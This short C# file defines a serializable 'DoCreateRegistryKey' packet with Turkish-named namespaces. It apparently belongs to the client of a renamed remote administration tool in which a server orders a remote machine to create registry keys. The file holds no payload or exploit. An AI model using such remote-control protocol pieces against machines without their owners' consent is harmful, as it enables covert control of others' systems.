﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoCreateRegistryKey : IPacket
    {
        public string ParentPath { get; set; }

        public DoCreateRegistryKey(string parentPath)
        {
            ParentPath = parentPath;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
